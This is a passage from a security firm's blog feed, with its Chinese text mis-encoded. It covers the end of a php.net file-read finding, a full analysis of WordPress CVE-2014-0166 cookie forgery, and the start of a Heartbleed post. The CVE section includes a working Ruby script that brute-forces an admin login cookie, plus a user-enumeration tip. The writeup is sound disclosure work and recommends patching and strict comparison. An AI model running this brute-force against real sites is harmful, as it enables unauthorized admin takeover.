&lt;p&gt;å¯ä»¥çœ‹åˆ°æ­¤è™•ä¸¦æœªå° $_GET[â€œfâ€] é€²è¡Œæª¢æŸ¥ï¼Œæ‰€ä»¥ä¿®æ”¹äº† $_GET[â€œfâ€] å¾Œï¼Œèˆ‡ $abs çµ„åˆå®Œï¼Œæœ€å¾Œå°±ç›´æ¥ä¸Ÿå…¥ readfile è®€å–æª”æ¡ˆã€‚æ¯”è¼ƒå€¼å¾—ç ”ç©¶çš„æ˜¯é€™é‚Šä½¿ç”¨äº† realpath èˆ‡ strncmp ä¾†æ¯”è¼ƒ f åŠ DOCUMENT_ROOTï¼Œç¢ºä¿ $abs åªèƒ½åœ¨ç¶²ç«™ç›®éŒ„ä¹‹ä¸‹ï¼Œæ‰€ä»¥ç„¡æ³•ä½¿ç”¨ ../../ (&lt;a href=&quot;https://www.owasp.org/index.php/Path_Traversal&quot;&gt;Path Traversal&lt;/a&gt;) çš„æ–¹å¼è·³è„«ç›®éŒ„é€²è¡Œæ›´é€²ä¸€æ­¥çš„æ»²é€ã€‚&lt;/p&gt;

&lt;p&gt;æœ€å¾Œæˆ‘å€‘å°‡æ­¤ç™¼ç¾å›å ±çµ¦ security@php.net ï¼Œå¾—åˆ°çš„å›æ‡‰æ˜¯ä»–å€‘æ˜¯ã€Œæ•…æ„çš„ (intentional)ã€ã€‚ä¸”å¾Œä¾†ä¹ŸçŸ¥é“ PHP å®˜ç¶²æ˜¯é–‹æ”¾åŸå§‹ç¢¼ï¼ˆOpen Sourceï¼‰çš„ï¼Œå¯ä»¥åˆ° &lt;a href=&quot;http://git.php.net/?p=web/php.git;a=tree&quot;&gt;http://git.php.net/?p=web/php.git;a=tree&lt;/a&gt; ä¸‹è¼‰æ•´å€‹å®˜ç¶²çš„åŸå§‹ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_04_php_team_response.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_04_php_team_response.png&quot; alt=&quot;PHP.NET å®˜ç¶²åœ˜éšŠå›æ‡‰&quot; title=&quot;PHP.NET å®˜ç¶²åœ˜éšŠå›æ‡‰&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;é›–ç„¶åœ¨é€™å€‹æ¡ˆä¾‹ä¸­ä¸¦æ²’æœ‰é€ æˆå¯¦è³ªä¸Šçš„å±å®³ï¼Œæ²’æœ‰å¸³è™Ÿã€å¯†ç¢¼ã€ç³»çµ±è¨­å®šç­‰æ©Ÿæ•è³‡æ–™ï¼Œä½†è‹¥æŠŠæ­¤ç¨®å¯«æ³•ç”¨åœ¨å…¶ä»–åœ°æ–¹ï¼Œå‰‡å¯èƒ½é€ æˆå¾ˆå¤§çš„è³‡å®‰é¢¨éšªã€‚å°±é€£ PHP å®˜æ–¹ç¶²ç«™éƒ½æœ‰é€™æ¨£çš„å¤±èª¤ï¼Œèº«ç‚ºé–‹ç™¼äººå“¡çš„ä½ å€‘æ›´ä¸å¯ä¸æ…ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference/</link>
                <guid>https://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference</guid>
                <pubDate>Thu, 24 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>CVE-2014-0166 WordPress å½é€  Cookie å¼±é»</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;åœ¨ä¸€é™£ OpenSSL Heartbleed æ·˜é‡‘æ½®ä¸­ï¼Œåˆæœ‰ä¸€å€‹æŠ€è¡“é–€æª»ä½ã€å¾Œæœåš´é‡ã€ä¹ŸåŒæ¨£éœ€è¦äº›é‹æ°£çš„æ¼æ´è¢«æ­ç™¼ï¼&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0166&quot;&gt;CVE-2014-0166&lt;/a&gt;ã€‚CVE-2014-0166 æ˜¯ WordPress ä¸Šé¢é©—è­‰ç™»å…¥ cookie çš„å¼±é»ï¼Œæ”»æ“Šè€…å¯ä»¥æš´åŠ›å½é€ å‡ºåˆæ³• cookieï¼Œè—‰æ­¤ç²å¾— WordPress æœ€é«˜æ¬Šé™ï¼Œé€²è€Œæ‹¿åˆ° shell å–å¾—ç³»çµ±æ“ä½œæ¬Šã€‚
è®“æˆ‘å€‘ä¾†åˆ†æä¸€ä¸‹é€™æ¬¡çš„å¼±é»æ˜¯ç™¼ç”Ÿäº†ä»€éº¼äº‹å§ï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;è§£æ&quot;&gt;è§£æ&lt;/h3&gt;

&lt;p&gt;é€™æ¬¡å‡ºå•é¡Œçš„ç¨‹å¼ç¢¼åœ¨&lt;a href=&quot;https://github.com/WordPress/WordPress/blob/684145ca8101e9ba5d9b4516709121fbe0fb9aee/wp-includes/pluggable.php#L650&quot;&gt;é€™é‚Š&lt;/a&gt;ï¼Œé—œéµç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wp_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pass_frag&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;|&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$expiration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$scheme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash_hmac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;md5&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;|&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$expiration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hmac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;cd&quot;&gt;/**
   * Fires if a bad authentication cookie hash is encountered.
   *
   * @since 2.7.0
   *
   * @param array $cookie_elements An array of data for the authentication cookie.
   */&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;do_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;auth_cookie_bad_hash&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å•é¡Œä¸»è¦ç™¼ç”Ÿåœ¨æ¯”è¼ƒé‹ç®—å­ != ä¸Šé¢ï¼Œ!= é‹ç®—å­æ˜¯ non-strictï¼Œæœƒåœ¨æ¯”è¼ƒå‰å…ˆåšå‹æ…‹è½‰æ›ï¼Œæ‰€ä»¥ä¸‹é¢çœ‹ä¼¼æ‡‰è©²æ˜¯å›å‚³ true çš„ä¾‹å­ï¼Œå…¨éƒ¨éƒ½é¡¯ç¤ºç‚º falseï¼Œç´°ç¯€è«‹åƒé–±&lt;a href=&quot;http://www.php.net/manual/en/language.operators.comparison.php&quot;&gt;å®˜æ–¹æ‰‹å†Š&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;01&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1 != 1 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1e1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 10 != 10 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1e2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 100 != 100 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0e10123456789012345678901234567890&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;é€²å…¥æ­£é¡Œï¼ŒWordPress èªè­‰èº«åˆ†ç”¨çš„ cookie å…§å®¹æ˜¯é€™æ¨£çš„ï¼šã€username|expiration|hmacã€ã€‚&lt;br /&gt;
username æ˜¯ä½¿ç”¨è€…åç¨±ï¼Œ&lt;br /&gt;
expiration æ˜¯æœ‰æ•ˆæœŸé™(timestamp)ï¼Œ&lt;br /&gt;
hmac å€¼ç”¨ä¾†é©—è­‰ cookie æ˜¯å¦åˆæ³•ã€‚&lt;br /&gt;
å¾ä¸Šé¢ç¨‹å¼ç¢¼å¯ä»¥çœ‹åˆ°ï¼Œhmac çš„ç®—æ³•æ˜¯ç¶“é usernameã€pass_fragã€expirationã€key ç¶œåˆå¾—å‡ºã€‚è‹¥æœ‰è¾¦æ³•æ§åˆ¶ cookie ä¸­çš„ hmac ä½¿ä¼ºæœå™¨èªç‚ºè©² cookie åˆæ³•ï¼Œå°±å¯ä»¥æˆåŠŸå½é€ æˆ usernameã€‚&lt;/p&gt;

&lt;p&gt;åˆ©ç”¨ç¨æ—©æåˆ°çš„æ¯”è¼ƒé‹ç®—å­å•é¡Œï¼Œè‹¥æˆ‘å€‘è®“ cookie ä¸­çš„ hmac å€¼ç‚º 0ï¼Œå¾ˆæœ‰å¯èƒ½è®“åˆ¤æ–·å¼è®Šæˆä¸‹é¢é€™æ¨£ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;//if ( $hmac != $hash ) {&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0e10123456789012345678901234567890&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;do_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;auth_cookie_bad_hash&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å¦‚æ­¤ä¾¿å¯ä»¥é€šéé©—è­‰ï¼ŒæˆåŠŸå½é€ åˆæ³• cookieã€‚&lt;br /&gt;
è€Œç‚ºäº†è®“ $hash == 0ï¼Œå¯ä»¥ä¸æ–·æ”¹è®Š cookie ä¸­çš„ expirationï¼Œè®“ç”¢ç”Ÿçš„ MD5 å€¼($hash)ç¶“éå‹æ…‹è½‰æ›å¾Œå‰›å¥½è®Šæˆ 0ã€‚&lt;br /&gt;
ç¬¦åˆ $hash == 0 çš„ MD5 $hash å€¼æœ‰ 
0eXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXã€00eXXXXXXXXXXXXXXXXXXXXXXXXXXXXXâ€¦.000000000000000000000000000eXã€00000000000000000000000000000 (X = 0,1,2,3,4,5,6,7,8,9)&lt;/p&gt;

&lt;p&gt;æ•…å‡ºç¾ $hash == 0 çš„æ©Ÿç‡ç‚º Sum(10^n,n=0,30)/16^32 = 3.265262085617465e-09&lt;/p&gt;

&lt;p&gt;æ¯æ¬¡å½é€ çš„æˆåŠŸæ©Ÿç‡ç´„ç‚ºä¸‰å„„åˆ†ä¹‹ä¸€ï¼Œä¸¦ä¸æœƒå¾ˆé«˜ï¼Œä½†å·²ç¶“è¶³å¤ åœ¨ä¸€å€‹æœˆå…§æ‹¿åˆ°æœ€é«˜æ¬Šé™ï¼Œè€Œä¸”æ‰€è€—æˆæœ¬ä¸¦ä¸æœƒå¾ˆé«˜ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å¯¦é©—&quot;&gt;å¯¦é©—&lt;/h3&gt;

&lt;p&gt;ç‚ºäº†é©—è­‰æ­¤æ–¹æ³•ä¹‹å¯è¡Œæ€§ï¼Œæˆ‘å€‘æ¶è¨­äº† &lt;a href=&quot;http://tw.WordPress.org/WordPress-3.8.1-zh_TW.zip&quot;&gt;WordPress 3.8.1&lt;/a&gt; ç’°å¢ƒã€‚ä¸¦ä¸”å¯«ç¨‹å¼å°‡ç™»å…¥ cookie ä¸­çš„ hmac è¨­ç‚º 0ï¼Œä¸æ–·èª¿æ•´ expiration å€¼æ¸¬è©¦æ˜¯å¦å·²ç¶“ç™»å…¥ï¼Œç¨‹å¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;httpclient&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;HTTPClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;WordPress_logged_in_de5be3cf9fcea023a1303527e10ea67a&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;800000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://domain.my/WordPress/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Cookie&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=admin%7C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%7C0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;include?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;logout&apos;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin%7C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%7C0&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;blockquote&gt;
  &lt;p&gt;è¨»ï¼šæ­¤ç¨‹å¼ç‚º POCï¼Œè«‹è‡ªè¡Œèª¿æ•´ç‚ºå¤šåŸ·è¡Œç·’ç‰ˆæœ¬ï¼Œä¸ç„¶é€Ÿåº¦æœƒå¾ˆæ…¢ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ç¶“éä¸€æ®µé•·æ™‚é–“çš„ç­‰å¾…ï¼Œå¾—åˆ°çš„çµæœå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140416/iTerm.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140416/iTerm.png&quot; alt=&quot;æš´åŠ›å½é€  cookieï¼Œç›´åˆ°æˆåŠŸç™»å…¥&quot; title=&quot;æš´åŠ›å½é€  cookieï¼Œç›´åˆ°æˆåŠŸç™»å…¥&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾—çŸ¥ç•¶ cookie ä¸­çš„ username ç‚º admin ä¸” expiration å€¼ç‚º 1421818232 æ™‚ï¼Œä¼ºæœå™¨ç®—å‡ºä¾†çš„ hmac ç¶“éå‹æ…‹è½‰æ›æœƒè®Šæˆ 0ã€‚æˆ‘å€‘å°‡æ¸¬è©¦æˆåŠŸçš„ cookie å€¼ï¼š admin%7C1421818232%7C0 è²¼åˆ°ç€è¦½å™¨ä¸Šã€‚æˆåŠŸè®Šæˆ admin å¦‚ä¸‹åœ–ï¼Œå¯¦é©—æˆåŠŸï¼&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140416/Mantra1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140416/Mantra1.png&quot; alt=&quot;åˆ©ç”¨å½é€ çš„ cookie ç™»å…¥ WordPress&quot; title=&quot;åˆ©ç”¨å½é€ çš„ cookie ç™»å…¥ WordPress&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;è¨»ï¼šä¸€èˆ¬ç‹€æ³ï¼Œè‹¥ä¸çŸ¥é“ WordPress æœ€é«˜æ¬Šé™çš„å¸³è™Ÿï¼Œå¯ä»¥åˆ©ç”¨ WordPress çš„ feature åœ¨ http://your.WordPress.com/?author=$id ($id: 1,2,3,4â€¦,999,â€¦) é é¢ä¸­åˆ—èˆ‰æ‰€æœ‰ä½¿ç”¨è€…å¸³è™Ÿã€‚é€šå¸¸ $id = 1 çš„ author éƒ½æœ‰ WordPress çš„ç®¡ç†æ¬Šé™ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;æœ€è¿‘å‡ºç¾äº†ä¸€å€‹é«˜é¢¨éšªé€šå ± CVE-2014-0166ï¼Œå…¶ä¸­æåŠ WordPress åœ¨èˆŠç‰ˆé©—è­‰ cookie çš„éƒ¨åˆ†å‡ºç¾å¼±é»ï¼Œå¯ä»¥å½é€ åˆæ³• cookieï¼Œé€²è€Œå–å¾— WordPress ç®¡ç†æ¬Šé™ã€‚æœ¬æ–‡åˆ†æäº†å…¶åŸç†ï¼Œä¸¦ä¸”è­‰å¯¦ä¹‹ã€‚&lt;/p&gt;

&lt;p&gt;å°æ–¼æ”»æ“Šè€…è€Œè¨€ï¼Œé›–ç„¶æ¯æ¬¡å½é€  cookie æˆåŠŸçš„æ©Ÿç‡ç´„ç‚ºä¸‰å„„åˆ†ä¹‹ä¸€ä¸¦ä¸é«˜ï¼Œä½†ç™¼é€ä¸‰å„„å€‹ request å¾Œæˆ–è¨±èƒ½æ‹¿åˆ°æœ€é«˜æ¬Šé™ï¼Œå·²ç¶“æ˜¯å€¼å¾—æŠ•è³‡çš„ç´šæ•¸ã€‚&lt;/p&gt;

&lt;p&gt;å°æ–¼ WordPress ç®¡ç†è€…è€Œè¨€ï¼Œå»ºè­°ç«‹å³æ›´æ–°è‡³ 3.8.2 ä»¥å¾Œç‰ˆæœ¬ï¼Œä»¥å…å—åˆ°æ­¤é¢¨éšªæ”»æ“Šã€‚&lt;/p&gt;

&lt;p&gt;å¾æ­¤äº‹ä»¶ä¹Ÿæé†’äº† PHP é–‹ç™¼è€…ï¼Œåœ¨æ’°å¯«é‡è¦çš„é©—è­‰è¡Œç‚ºï¼Œè¦ç‰¹åˆ¥æ³¨æ„ PHP æ¯”è¼ƒé‹ç®—å­çš„ç‰¹æ€§ï¼Œè«‹ä½¿ç”¨ === (ä¸ç­‰æ–¼è«‹ç”¨ !==)ä¾†ä¿è­‰ç­‰å¼å·¦å³å‹æ…‹èˆ‡å€¼ç‚ºä¸€æ¨£ï¼Œé¿å…å› ç‚ºè½‰å‹é€ æˆçš„è³‡å®‰é¢¨éšªã€‚&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities/</link>
                <guid>https://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities</guid>
                <pubDate>Wed, 16 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL Heartbleed å…¨çƒé§­å®¢çš„æ®ºæˆ®ç¥­å…¸ï¼Œä½ åƒèˆ‡äº†å—ï¼Ÿ</title>
                <description>&lt;p&gt;ä½ è·Ÿä¸Šäº† OpenSSL Heartbleed çš„ç¥­å…¸äº†å—ï¼Ÿå¦‚æœé‚„æ²’æœ‰ï¼Œåˆ¥å¿˜è¨˜è©³ç´°é–±è®€ä¸€ä¸‹æˆ‘å€‘çš„å‰æ–‡ã€Œ&lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed åš´é‡æ¼æ´&lt;/a&gt;ã€ã€‚&lt;/p&gt;

&lt;p&gt;é€™å¹¾å¤©ä¸å°‘ä¼æ¥­ã€æ°‘çœ¾éƒ½ä¸æ–·ä¾†è©¢å•æˆ‘å€‘ç›¸å°æ‡‰çš„è§£æ±ºæ–¹æ¡ˆï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Heartbleed è·Ÿæˆ‘æœ‰é—œå—ï¼Ÿæˆ‘è©²æ€éº¼çŸ¥é“ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;æˆ‘è©²æ€éº¼æ›´æ–° OpenSSLï¼Ÿ&lt;/li&gt;
  &lt;li&gt;æˆ‘å¦‚æœä¸èƒ½æ›´æ–°ï¼Œè¦æ€éº¼é˜²æ­¢æ”»æ“Šï¼Ÿ&lt;/li&gt;
  &lt;li&gt;Heartbleed æ¼æ´æ”»æ“Šè€…æœƒæ€éº¼åˆ©ç”¨ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;ç›®å‰å—å®³çš„ç‹€æ³å¦‚ä½•ï¼Ÿ&lt;/li&gt;
  &lt;li&gt;æˆ‘åªæ˜¯ä¸€èˆ¬æ°‘çœ¾ï¼Œè©²å¦‚ä½•æ‡‰å°ï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æˆ‘ç›¸ä¿¡ä¸å°‘äººéƒ½æœ‰é¡ä¼¼çš„ç–‘å•ï¼Œæˆ‘å€‘ä»¥é€™ç¯‡å°ˆæ–‡è£œéºä¸Šæ¬¡æ²’æåˆ°çš„è³‡è¨Šã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;æ”»æ“Šæ‰‹æ³•ç¤ºç¯„&quot;&gt;æ”»æ“Šæ‰‹æ³•ç¤ºç¯„&lt;/h3&gt;

